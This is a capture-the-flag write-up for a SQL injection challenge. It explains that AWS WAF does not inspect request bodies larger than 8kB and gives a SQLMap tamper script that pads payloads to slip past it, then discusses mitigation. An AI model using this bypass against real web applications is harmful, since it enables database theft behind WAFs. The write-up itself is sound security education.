# Asuna Waffles

> I really love blue-berry waffles. I really do. Even Asuna loves it too! There are two users, flag is in one of the columns.\
> \
> http://asuna.nullsession.pw\
> \
> author: Gladiator

Going to the index page, we are told that this is yet another SQL injection challenge ™️

```http
HTTP/1.1 200 OK
Date: Mon, 14 Mar 2022 04:44:43 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 114
Connection: close
Access-Control-Allow-Headers: *
Access-Control-Allow-Methods: POST, GET, OPTIONS, PUT, DELETE
Access-Control-Allow-Origin: *
Access-Control-Expose-Headers: Content-Disposition
X-Request-Id: 3dfaa711-24bc-4755-b720-4b0fbfa16335

You can try using /search to search. Example: /search?q=bob ["SELECT * FROM user WHERE username = '"+username+"'"]
```

However, once we start fuzzing some classic SQLi payloads, we would quickly find that the challenge is not so simple. We are instead greeted with a 403 Forbidden page.

```http
HTTP/1.1 403 Forbidden
Server: awselb/2.0
Date: Mon, 14 Mar 2022 04:45:55 GMT
Content-Type: text/html
Content-Length: 520
Connection: close

<html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>
</body>
</html>
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
```

One would notice, however, that the `Server` header is now present. We know that the application is put behind an AWS ELB, so we could guess that the AWS WAF is the one blocking our SQLi requests.

### Dangerous Defaults

A quick look at the AWS WAF [documentation](https://docs.aws.amazon.com/waf/latest/developerguide/waf-rule-statement-fields.html) would sound some alarm bells with these red warning boxes:

![](<../../.gitbook/assets/Screenshot 2022-03-14 at 12.48.58 PM.png>)

Wait... this can't be... can it? Surely there must be some other default rule that says that anything longer than 8kB is blocked without even being passed to the WAF... right?

Well, a simple test showed otherwise. Even a trivial payload like `aaa...[8kB]...aaa' or '1` would succeed. We could therefore dump the database using SQLi payloads longer than 8kB!

I was too lazy to do this manually, so I just wrote a simple SQLMap tamper script that prepends 8192 `"a"`s to the payload.

```python
#!/usr/bin/env python
from lib.core.enums import PRIORITY
import re

__priority__ = PRIORITY.NORMAL
def dependencies():
    pass

def tamper(payload, **kwargs):
    return "a" * 8192 + payload
```

Dumping the database with SQLMap then gave the flag :smile:

`CTFSG{A_Cru3l_Summ3r_W1th_SAO_RELEASE_RECOLLECTION}`

### Is There a Mitigation?

Looking at the [managed rule groups changelog](https://docs.aws.amazon.com/waf/latest/developerguide/aws-managed-rule-groups-changelog.html), it seems the `SizeRestrictions_BODY` rule in the Core Rule Set was recently changed to block payloads larger than 8kB instead of 10kB, likely due to [this blog post](https://osamaelnaggar.com/blog/aws\_waf\_dangerous\_defaults/).

If we use the above rule together with SQLi detection, this would be mitigated. But this is not a default rule added out of the box, and a developer would likely not be aware that one has to use it in order to make their WAF effective. :thinking:
